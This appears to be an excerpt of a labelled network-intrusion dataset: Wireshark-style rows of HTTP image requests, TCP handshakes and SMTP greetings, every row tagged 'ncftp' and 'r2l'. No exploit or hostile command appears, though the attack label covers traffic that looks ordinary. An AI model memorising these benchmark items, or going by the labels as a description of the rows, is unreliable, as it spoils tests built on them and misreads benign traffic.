"ncftp"," r2l", "414900","12:13:48.106925","172.16.117.103","207.37.243.56","HTTP","298","GET /images/hm_factoids_02_03.gif HTTP/1.0 "
"ncftp"," r2l", "414901","12:13:48.120748","207.37.243.56","172.16.117.103","TCP","60","80 → 10574 [ACK] Seq=1 Ack=245 Win=32492 Len=0"
"ncftp"," r2l", "414902","12:13:48.143588","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414903","12:13:48.144817","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414904","12:13:48.145030","207.37.243.56","172.16.117.103","TCP","241","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414905","12:13:48.145101","207.37.243.56","172.16.117.103","HTTP","60","HTTP/1.1 404 File Not Found  (text/html)"
"ncftp"," r2l", "414906","12:13:48.145259","172.16.117.103","207.37.243.56","TCP","60","10574 → 80 [ACK] Seq=245 Ack=189 Win=31932 Len=0"
"ncftp"," r2l", "414907","12:13:48.151525","172.16.117.103","207.37.243.56","TCP","60","10574 → 80 [FIN, ACK] Seq=245 Ack=189 Win=32120 Len=0"
"ncftp"," r2l", "414908","12:13:48.151702","172.16.116.44","198.83.178.23","TCP","60","10570 → 80 [ACK] Seq=200 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "414909","12:13:48.151904","172.16.117.103","207.37.243.56","TCP","60","10575 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414910","12:13:48.155061","207.37.243.56","172.16.117.103","TCP","60","80 → 10574 [ACK] Seq=189 Ack=246 Win=32735 Len=0"
"ncftp"," r2l", "414911","12:13:48.158366","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414912","12:13:48.159645","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414913","12:13:48.160876","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414914","12:13:48.161004","207.37.243.56","172.16.117.103","TCP","60","80 → 10575 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414915","12:13:48.161131","172.16.117.103","207.37.243.56","TCP","60","10575 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414916","12:13:48.161699","172.16.116.44","198.83.178.23","TCP","60","10570 → 80 [ACK] Seq=200 Ack=7301 Win=30660 Len=0"
"ncftp"," r2l", "414917","12:13:48.162306","172.16.117.103","207.37.243.56","HTTP","293","GET /images/hm_btm_arw04.gif HTTP/1.0 "
"ncftp"," r2l", "414918","12:13:48.167943","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414919","12:13:48.168445","198.83.178.23","172.16.116.44","HTTP","612","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414920","12:13:48.168515","198.83.178.23","172.16.116.44","TCP","60","80 → 10570 [FIN, ACK] Seq=9319 Ack=200 Win=32736 Len=0"
"ncftp"," r2l", "414921","12:13:48.168655","172.16.116.44","198.83.178.23","TCP","60","10570 → 80 [ACK] Seq=200 Ack=9320 Win=30660 Len=0"
"ncftp"," r2l", "414922","12:13:48.169174","172.16.116.44","198.83.178.23","TCP","60","10570 → 80 [FIN, ACK] Seq=200 Ack=9320 Win=32120 Len=0"
"ncftp"," r2l", "414923","12:13:48.172548","172.16.116.44","198.83.178.23","TCP","60","10576 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414924","12:13:48.173469","198.83.178.23","172.16.116.44","TCP","60","80 → 10570 [ACK] Seq=9320 Ack=201 Win=32735 Len=0"
"ncftp"," r2l", "414925","12:13:48.175323","198.83.178.23","172.16.116.44","TCP","60","80 → 10576 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414926","12:13:48.175482","172.16.116.44","198.83.178.23","TCP","60","10576 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414927","12:13:48.176033","172.16.116.44","198.83.178.23","HTTP","264","GET /SEL/img/cloudbot-outside.gif HTTP/1.0 "
"ncftp"," r2l", "414928","12:13:48.181705","207.37.243.56","172.16.117.103","TCP","60","80 → 10575 [ACK] Seq=1 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414929","12:13:48.190722","198.83.178.23","172.16.116.44","TCP","60","80 → 10576 [ACK] Seq=1 Ack=211 Win=32526 Len=0"
"ncftp"," r2l", "414930","12:13:48.205575","207.37.243.56","172.16.117.103","HTTP","637","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"ncftp"," r2l", "414931","12:13:48.205643","207.37.243.56","172.16.117.103","TCP","60","80 → 10575 [FIN, ACK] Seq=584 Ack=240 Win=32736 Len=0"
"ncftp"," r2l", "414932","12:13:48.205853","172.16.117.103","207.37.243.56","TCP","60","10575 → 80 [ACK] Seq=240 Ack=585 Win=31536 Len=0"
"ncftp"," r2l", "414933","12:13:48.219393","172.16.117.103","207.37.243.56","TCP","60","10575 → 80 [FIN, ACK] Seq=240 Ack=585 Win=32120 Len=0"
"ncftp"," r2l", "414934","12:13:48.222945","207.37.243.56","172.16.117.103","TCP","60","80 → 10575 [ACK] Seq=585 Ack=241 Win=32735 Len=0"
"ncftp"," r2l", "414935","12:13:48.225534","172.16.117.103","207.37.243.56","TCP","60","10582 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414936","12:13:48.229798","207.37.243.56","172.16.117.103","TCP","60","80 → 10582 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414937","12:13:48.229976","172.16.117.103","207.37.243.56","TCP","60","10582 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414938","12:13:48.230469","172.16.117.103","207.37.243.56","HTTP","295","GET /images/hm_ligne1_col3.gif HTTP/1.0 "
"ncftp"," r2l", "414939","12:13:48.245785","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414940","12:13:48.247010","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414941","12:13:48.250717","207.37.243.56","172.16.117.103","TCP","60","80 → 10582 [ACK] Seq=1 Ack=242 Win=32736 Len=0"
"ncftp"," r2l", "414942","12:13:48.251685","172.16.116.44","198.83.178.23","TCP","60","10576 → 80 [ACK] Seq=211 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "414943","12:13:48.256858","198.83.178.23","172.16.116.44","HTTP","745","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414944","12:13:48.256924","198.83.178.23","172.16.116.44","TCP","60","80 → 10576 [FIN, ACK] Seq=3612 Ack=211 Win=32736 Len=0"
"ncftp"," r2l", "414945","12:13:48.257082","172.16.116.44","198.83.178.23","TCP","60","10576 → 80 [ACK] Seq=211 Ack=3613 Win=31428 Len=0"
"ncftp"," r2l", "414946","12:13:48.257574","172.16.116.44","198.83.178.23","TCP","60","10576 → 80 [FIN, ACK] Seq=211 Ack=3613 Win=32120 Len=0"
"ncftp"," r2l", "414947","12:13:48.261197","172.16.116.44","198.83.178.23","TCP","60","10586 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414948","12:13:48.261913","198.83.178.23","172.16.116.44","TCP","60","80 → 10576 [ACK] Seq=3613 Ack=212 Win=32735 Len=0"
"ncftp"," r2l", "414949","12:13:48.263843","198.83.178.23","172.16.116.44","TCP","60","80 → 10586 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414950","12:13:48.263989","172.16.116.44","198.83.178.23","TCP","60","10586 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414951","12:13:48.264450","172.16.116.44","198.83.178.23","HTTP","265","GET /SEL/img/electronics_off_3.gif HTTP/1.0 "
"ncftp"," r2l", "414952","12:13:48.279047","207.37.243.56","172.16.117.103","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414953","12:13:48.279318","207.37.243.56","172.16.117.103","HTTP","316","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414954","12:13:48.279388","207.37.243.56","172.16.117.103","TCP","60","80 → 10582 [FIN, ACK] Seq=1287 Ack=242 Win=32736 Len=0"
"ncftp"," r2l", "414955","12:13:48.279543","172.16.117.103","207.37.243.56","TCP","60","10582 → 80 [ACK] Seq=242 Ack=1288 Win=30833 Len=0"
"ncftp"," r2l", "414956","12:13:48.283272","198.83.178.23","172.16.116.44","TCP","60","80 → 10586 [ACK] Seq=1 Ack=212 Win=32736 Len=0"
"ncftp"," r2l", "414957","12:13:48.293795","198.83.178.23","172.16.116.44","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414958","12:13:48.294026","198.83.178.23","172.16.116.44","HTTP","263","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414959","12:13:48.294094","198.83.178.23","172.16.116.44","TCP","60","80 → 10586 [FIN, ACK] Seq=1234 Ack=212 Win=32736 Len=0"
"ncftp"," r2l", "414960","12:13:48.294242","172.16.116.44","198.83.178.23","TCP","60","10586 → 80 [ACK] Seq=212 Ack=1235 Win=30886 Len=0"
"ncftp"," r2l", "414961","12:13:48.303326","172.16.116.44","198.83.178.23","TCP","60","10586 → 80 [FIN, ACK] Seq=212 Ack=1235 Win=32120 Len=0"
"ncftp"," r2l", "414962","12:13:48.306837","172.16.116.44","198.83.178.23","TCP","60","10587 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414963","12:13:48.307322","198.83.178.23","172.16.116.44","TCP","60","80 → 10586 [ACK] Seq=1235 Ack=213 Win=32735 Len=0"
"ncftp"," r2l", "414964","12:13:48.307609","172.16.117.103","207.37.243.56","TCP","60","10582 → 80 [FIN, ACK] Seq=242 Ack=1288 Win=32120 Len=0"
"ncftp"," r2l", "414965","12:13:48.311638","198.83.178.23","172.16.116.44","TCP","60","80 → 10587 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414966","12:13:48.311804","172.16.116.44","198.83.178.23","TCP","60","10587 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414967","12:13:48.312310","207.37.243.56","172.16.117.103","TCP","60","80 → 10582 [ACK] Seq=1288 Ack=243 Win=32735 Len=0"
"ncftp"," r2l", "414968","12:13:48.312996","172.16.116.44","198.83.178.23","HTTP","256","GET /SEL/img/cloudtop.gif HTTP/1.0 "
"ncftp"," r2l", "414969","12:13:48.313520","172.16.117.103","207.37.243.56","TCP","60","10627 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414970","12:13:48.317684","207.37.243.56","172.16.117.103","TCP","60","80 → 10627 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414971","12:13:48.317841","172.16.117.103","207.37.243.56","TCP","60","10627 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414972","12:13:48.318280","172.16.117.103","207.37.243.56","HTTP","295","GET /images/hm_lbn_tp_rbtm.gif HTTP/1.0 "
"ncftp"," r2l", "414973","12:13:48.330700","198.83.178.23","172.16.116.44","TCP","60","80 → 10587 [ACK] Seq=1 Ack=203 Win=32736 Len=0"
"ncftp"," r2l", "414974","12:13:48.337409","197.218.177.69","172.16.113.84","SMTP","75","C: EHLO pluto.plum.net"
"ncftp"," r2l", "414975","12:13:48.337692","172.16.113.84","197.218.177.69","SMTP","80","S: 500 Command unrecognized"
"ncftp"," r2l", "414976","12:13:48.340684","207.37.243.56","172.16.117.103","TCP","60","80 → 10627 [ACK] Seq=1 Ack=242 Win=32495 Len=0"
"ncftp"," r2l", "414977","12:13:48.353274","197.218.177.69","172.16.113.84","TCP","60","20250 → 25 [ACK] Seq=22 Ack=112 Win=32120 Len=0"
"ncftp"," r2l", "414978","12:13:48.366063","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414979","12:13:48.367293","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414980","12:13:48.371644","172.16.116.44","198.83.178.23","TCP","60","10587 → 80 [ACK] Seq=203 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "414981","12:13:48.376430","198.83.178.23","172.16.116.44","HTTP","551","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414982","12:13:48.376499","198.83.178.23","172.16.116.44","TCP","60","80 → 10587 [FIN, ACK] Seq=3418 Ack=203 Win=32736 Len=0"
"ncftp"," r2l", "414983","12:13:48.376633","172.16.116.44","198.83.178.23","TCP","60","10587 → 80 [ACK] Seq=203 Ack=3419 Win=31622 Len=0"
"ncftp"," r2l", "414984","12:13:48.376989","172.16.116.44","198.83.178.23","TCP","60","10587 → 80 [FIN, ACK] Seq=203 Ack=3419 Win=32120 Len=0"
"ncftp"," r2l", "414985","12:13:48.380212","172.16.116.44","198.83.178.23","TCP","60","10635 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414986","12:13:48.381416","198.83.178.23","172.16.116.44","TCP","60","80 → 10587 [ACK] Seq=3419 Ack=204 Win=32735 Len=0"
"ncftp"," r2l", "414987","12:13:48.383357","198.83.178.23","172.16.116.44","TCP","60","80 → 10635 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414988","12:13:48.383499","172.16.116.44","198.83.178.23","TCP","60","10635 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414989","12:13:48.383925","172.16.116.44","198.83.178.23","HTTP","267","GET /SEL/img/specials/vaiodirect.gif HTTP/1.0 "
"ncftp"," r2l", "414990","12:13:48.392982","207.37.243.56","172.16.117.103","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "414991","12:13:48.393084","207.37.243.56","172.16.117.103","HTTP","102","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "414992","12:13:48.393153","207.37.243.56","172.16.117.103","TCP","60","80 → 10627 [FIN, ACK] Seq=1073 Ack=242 Win=32736 Len=0"
"ncftp"," r2l", "414993","12:13:48.393314","172.16.117.103","207.37.243.56","TCP","60","10627 → 80 [ACK] Seq=242 Ack=1074 Win=32120 Len=0"
"ncftp"," r2l", "414994","12:13:48.393886","172.16.117.103","207.37.243.56","TCP","60","10627 → 80 [FIN, ACK] Seq=242 Ack=1074 Win=32120 Len=0"
"ncftp"," r2l", "414995","12:13:48.395893","172.16.117.103","207.37.243.56","TCP","60","10636 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "414996","12:13:48.397542","207.37.243.56","172.16.117.103","TCP","60","80 → 10627 [ACK] Seq=1074 Ack=243 Win=32735 Len=0"
"ncftp"," r2l", "414997","12:13:48.398854","207.37.243.56","172.16.117.103","TCP","60","80 → 10636 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "414998","12:13:48.399042","172.16.117.103","207.37.243.56","TCP","60","10636 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "414999","12:13:48.399902","172.16.117.103","207.37.243.56","HTTP","302","GET /french/images/hm_ligne4_col4.gif HTTP/1.0 "
"ncftp"," r2l", "415000","12:13:48.402451","198.83.178.23","172.16.116.44","TCP","60","80 → 10635 [ACK] Seq=1 Ack=214 Win=32736 Len=0"
"ncftp"," r2l", "415001","12:13:48.415342","198.83.178.23","172.16.116.44","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415002","12:13:48.415728","198.83.178.23","172.16.116.44","HTTP","461","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "415003","12:13:48.415799","198.83.178.23","172.16.116.44","TCP","60","80 → 10635 [FIN, ACK] Seq=1432 Ack=214 Win=32736 Len=0"
"ncftp"," r2l", "415004","12:13:48.415929","172.16.116.44","198.83.178.23","TCP","60","10635 → 80 [ACK] Seq=214 Ack=1433 Win=30688 Len=0"
"ncftp"," r2l", "415005","12:13:48.416390","172.16.116.44","198.83.178.23","TCP","60","10635 → 80 [FIN, ACK] Seq=214 Ack=1433 Win=32120 Len=0"
"ncftp"," r2l", "415006","12:13:48.419538","172.16.116.44","198.83.178.23","TCP","60","10675 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "415007","12:13:48.420847","198.83.178.23","172.16.116.44","TCP","60","80 → 10635 [ACK] Seq=1433 Ack=215 Win=32735 Len=0"
"ncftp"," r2l", "415008","12:13:48.422779","198.83.178.23","172.16.116.44","TCP","60","80 → 10675 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "415009","12:13:48.422921","172.16.116.44","198.83.178.23","TCP","60","10675 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "415010","12:13:48.423002","207.37.243.56","172.16.117.103","TCP","60","80 → 10636 [ACK] Seq=1 Ack=249 Win=32736 Len=0"
"ncftp"," r2l", "415011","12:13:48.423399","172.16.116.44","198.83.178.23","HTTP","264","GET /SEL/img/professional/pro.gif HTTP/1.0 "
"ncftp"," r2l", "415012","12:13:48.441533","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415013","12:13:48.442764","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415014","12:13:48.442834","198.83.178.23","172.16.116.44","TCP","60","80 → 10675 [ACK] Seq=1 Ack=211 Win=32526 Len=0"
"ncftp"," r2l", "415015","12:13:48.451625","172.16.117.103","207.37.243.56","TCP","60","10636 → 80 [ACK] Seq=249 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "415016","12:13:48.457754","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415017","12:13:48.459009","207.37.243.56","172.16.117.103","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415018","12:13:48.459435","207.37.243.56","172.16.117.103","HTTP","490","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "415019","12:13:48.461627","172.16.117.103","207.37.243.56","TCP","60","10636 → 80 [ACK] Seq=249 Ack=6277 Win=32120 Len=0"
"ncftp"," r2l", "415020","12:13:48.465274","207.37.243.56","172.16.117.103","TCP","60","80 → 10636 [FIN, ACK] Seq=6277 Ack=249 Win=32736 Len=0"
"ncftp"," r2l", "415021","12:13:48.465420","172.16.117.103","207.37.243.56","TCP","60","10636 → 80 [ACK] Seq=249 Ack=6278 Win=32120 Len=0"
"ncftp"," r2l", "415022","12:13:48.465662","172.16.117.103","207.37.243.56","TCP","60","10636 → 80 [FIN, ACK] Seq=249 Ack=6278 Win=32120 Len=0"
"ncftp"," r2l", "415023","12:13:48.467651","172.16.117.103","207.37.243.56","TCP","60","10676 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "415024","12:13:48.469615","207.37.243.56","172.16.117.103","TCP","60","80 → 10636 [ACK] Seq=6278 Ack=250 Win=32735 Len=0"
"ncftp"," r2l", "415025","12:13:48.470994","207.37.243.56","172.16.117.103","TCP","60","80 → 10676 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "415026","12:13:48.471137","172.16.117.103","207.37.243.56","TCP","60","10676 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "415027","12:13:48.471714","172.16.117.103","207.37.243.56","HTTP","294","GET /images/hm_lbn_tp_btm.gif HTTP/1.0 "
"ncftp"," r2l", "415028","12:13:48.481632","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415029","12:13:48.482860","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415030","12:13:48.490707","207.37.243.56","172.16.117.103","TCP","60","80 → 10676 [ACK] Seq=1 Ack=241 Win=32736 Len=0"
"ncftp"," r2l", "415031","12:13:48.491614","172.16.116.44","198.83.178.23","TCP","60","10675 → 80 [ACK] Seq=211 Ack=2921 Win=32120 Len=0"
"ncftp"," r2l", "415032","12:13:48.492689","207.37.243.56","172.16.117.103","TCP","1078","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415033","12:13:48.492870","207.37.243.56","172.16.117.103","HTTP","199","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "415034","12:13:48.492938","207.37.243.56","172.16.117.103","TCP","60","80 → 10676 [FIN, ACK] Seq=1170 Ack=241 Win=32736 Len=0"
"ncftp"," r2l", "415035","12:13:48.493077","172.16.117.103","207.37.243.56","TCP","60","10676 → 80 [ACK] Seq=241 Ack=1171 Win=32120 Len=0"
"ncftp"," r2l", "415036","12:13:48.493571","172.16.117.103","207.37.243.56","TCP","60","10676 → 80 [FIN, ACK] Seq=241 Ack=1171 Win=32120 Len=0"
"ncftp"," r2l", "415037","12:13:48.495567","172.16.117.103","207.37.243.56","TCP","60","10677 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "415038","12:13:48.498640","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415039","12:13:48.499894","198.83.178.23","172.16.116.44","TCP","1514","[TCP segment of a reassembled PDU]"
"ncftp"," r2l", "415040","12:13:48.500512","198.83.178.23","172.16.116.44","HTTP","763","HTTP/1.1 200 OK  (GIF89a)"
"ncftp"," r2l", "415041","12:13:48.500582","207.37.243.56","172.16.117.103","TCP","60","80 → 10676 [ACK] Seq=1171 Ack=242 Win=32735 Len=0"
"ncftp"," r2l", "415042","12:13:48.500652","207.37.243.56","172.16.117.103","TCP","60","80 → 10677 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "415043","12:13:48.500797","172.16.117.103","207.37.243.56","TCP","60","10677 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "415044","12:13:48.501412","172.16.117.103","207.37.243.56","HTTP","297","GET /french/images/hm_winner.jpg HTTP/1.0 "
"ncftp"," r2l", "415045","12:13:48.501615","172.16.116.44","198.83.178.23","TCP","60","10675 → 80 [ACK] Seq=211 Ack=6550 Win=32120 Len=0"
"ncftp"," r2l", "415046","12:13:48.505857","198.83.178.23","172.16.116.44","TCP","60","80 → 10675 [FIN, ACK] Seq=6550 Ack=211 Win=32736 Len=0"
"ncftp"," r2l", "415047","12:13:48.505996","172.16.116.44","198.83.178.23","TCP","60","10675 → 80 [ACK] Seq=211 Ack=6551 Win=32120 Len=0"
"ncftp"," r2l", "415048","12:13:48.506253","172.16.116.44","198.83.178.23","TCP","60","10675 → 80 [FIN, ACK] Seq=211 Ack=6551 Win=32120 Len=0"
"ncftp"," r2l", "415049","12:13:48.509493","172.16.116.44","198.83.178.23","TCP","60","10740 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "415050","12:13:48.510002","198.83.178.23","172.16.116.44","TCP","60","80 → 10675 [ACK] Seq=6551 Ack=212 Win=32735 Len=0"
"ncftp"," r2l", "415051","12:13:48.514079","198.83.178.23","172.16.116.44","TCP","60","80 → 10740 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "415052","12:13:48.514219","172.16.116.44","198.83.178.23","TCP","60","10740 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "415053","12:13:48.514635","172.16.116.44","198.83.178.23","HTTP","262","GET /SEL/img/wireless_off_3.gif HTTP/1.0 "
"ncftp"," r2l", "415054","12:13:48.520641","207.37.243.56","172.16.117.103","TCP","60","80 → 10677 [ACK] Seq=1 Ack=244 Win=32493 Len=0"
"ncftp"," r2l", "415055","12:13:48.530653","198.83.178.23","172.16.116.44","TCP","60","80 → 10740 [ACK] Seq=1 Ack=209 Win=32528 Len=0"
"ncftp"," r2l", "415056","12:13:48.543421","197.218.177.69","172.16.113.84","SMTP","75","C: HELO pluto.plum.net"
